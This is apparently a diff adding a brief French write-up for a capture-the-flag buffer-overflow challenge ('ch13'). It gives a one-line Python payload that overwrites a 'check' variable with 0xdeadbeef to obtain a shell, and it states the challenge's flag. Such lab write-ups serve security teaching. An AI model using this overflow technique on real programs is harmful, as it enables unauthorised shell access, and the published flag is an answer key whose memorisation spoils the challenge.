@@ -1,0 +1,9 @@
+
+expliacation:
+    il faut ecraser le contenu de la variable check avec deadbeef 
+    pour cela on execute cette commande :
+
+(python -c 'print "A"*40 + "\xef\xbe\xad\xde"' ;cat) | ./ch13
+
+le "cat" c'est pour garder le shell 
+ainsi selon les donnée du challenge on fait un cat de .passwd et le flag est : 1w4ntm0r3pr0np1s
